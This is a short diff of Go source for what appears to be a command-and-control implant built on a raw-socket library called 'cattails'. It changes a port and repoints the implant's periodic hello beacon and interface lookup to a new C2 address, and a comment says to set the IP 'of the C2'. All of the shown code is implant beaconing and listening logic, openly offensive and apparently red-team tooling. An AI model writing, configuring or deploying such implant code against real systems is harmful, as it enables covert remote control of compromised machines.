@@ -21,7 +21,7 @@ func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Hardware
 		fd := cattails.NewSocket()
 		defer unix.Close(fd)
 
-		packet := cattails.CreatePacket(iface, src, dst, 18000, 1337, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))
+		packet := cattails.CreatePacket(iface, src, dst, 18000, 56969, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))
 
 		addr := cattails.CreateAddrStruct(iface)
 
@@ -91,7 +91,7 @@ func main() {
 	// fmt.Println("[+] Socket created")
 
 	// Get information that is needed for networking
-	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
+	iface, src := cattails.GetOutwardIface("192.168.6.104:80")
 	// fmt.Println("[+] Using interface:", iface.Name)
 
 	dstMAC, err := cattails.GetRouterMAC()
@@ -104,7 +104,7 @@ func main() {
 	// Start hello timer
 	// Set the below IP to the IP of the C2
 	// 192.168.4.6
-	go sendHello(iface, src, net.IPv4(192, 168, 4, 6), dstMAC)
+	go sendHello(iface, src, net.IPv4(192, 168, 6, 104), dstMAC)
 
 	// Listen for responses
 	// fmt.Println("[+] Listening")
